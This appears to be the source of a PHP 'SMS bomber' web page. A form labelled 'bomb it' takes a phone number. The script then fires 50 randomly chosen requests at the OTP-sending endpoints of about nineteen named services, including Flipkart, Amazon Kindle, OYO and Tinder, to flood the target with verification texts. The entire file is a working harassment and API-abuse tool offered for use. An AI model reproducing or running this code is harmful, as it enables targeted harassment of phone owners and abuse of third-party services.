<html>
<HEAD><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-153195185-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-153195185-1');
</script>
</HEAD>
<body style="background-color:Cyan;"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<form method="POST" action=""><center>
  Number:<br>
  <input type="text" name="number"><br><br>
  <input type="submit" name="submit" value="bomb it"></center>
</form>
</html>



<?php
include 'functions.php';


if(isset($_POST["submit"])) {
    $mobile=$_POST['number'];
    
    




$x=0;

while (50 > $x){
//$value=19;
$value=(rand(1,19));


if($value == 1) {
			redbus('https://m.redbus.in/api/sendOtp?number='.$mobile.'&cc=91');
		}
		if($value == 2) {
			bsnl('https://portal.bsnl.in/myportal/validatemobile.do',$mobile);
		}
		if($value == 3) {
			flipkart('https://www.flipkart.com/api/5/user/otp/generate',$mobile);
		}
		if($value == 4) {
			hike('http://api.im.hike.in/v3/account/validate?digits=4',$mobile);
		}
		if($value == 5) {
			justdial('https://www.justdial.com/functions/whatsappverification.php',$mobile);
		}
		if($value == 6) {
			kindle('https://www.amazon.in/kindle-dbs/ajax/SendSMSorEmail?ref_=kcpapp_snt_sms',$mobile);
		}
		if($value == 7) {
			lenskart('https://apimum.notifyvisitors.com/clients/lenskart/smsApi',$mobile);
		}
		if($value == 8) {
			mobiwik('https://webapi.mobikwik.com/p/account/otp/cell/v2',$mobile);
		}
		if($value == 9) {
			oyo('https://www.oyorooms.com/api/pwa/generateotp?phone='.$mobile.'&country_code=%2B91&nod=4');
		}
		if($value == 10) {
			spencers('https://www.spencers.in//sms/index/index',$mobile);
		}
		if($value == 11) {
			sulekha('https://myaccount.sulekha.com/network/userauthsulv2.aspx?mode=sendvcode&mobilenumber='.$mobile.'&rnd=0.535635589810822&callback=jQuery110208176050023941663_1559125529412',$mobile);
		}
		if($value == 12) {
			treebo('https://www.treebo.com/api/v2/auth/login/otp/',$mobile);
		}
		if($value == 13) {
			urbanclap('https://www.urbanclap.com/api/v3/customers/simplegenerateotp',$mobile);
		}
		if($value == 14) {
			wynk('https://sapi.wynk.in/music/v2/account/otp',$mobile);
		}
		if($value == 15) {
			yatra('https://secure.yatra.com/social/common/yatra/sendMobileOTP',$mobile);
		}
		if($value == 16) {
			dvotp('https://direct.delhivery.com/order/generate-otp?phoneNo='.$mobile);
		}
		if($value == 17) {
			confirmtkt('https://securedapi.confirmtkt.com/api/platform/register?mobileNumber='.$mobile.'&newOtp=true');
		}
		if($value == 18) {
			happily('https://backend.happilyunmarried.com/rest/V1/api/registrationsendsms?receiverPhoneNumber='.$mobile.'&email=iamtheowner@gmail.com&storeId=3&type=otp');
        }
        if($value == 19){
            tinder('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en0',$mobile);
        }

        $x=$x+1;
}
}
?>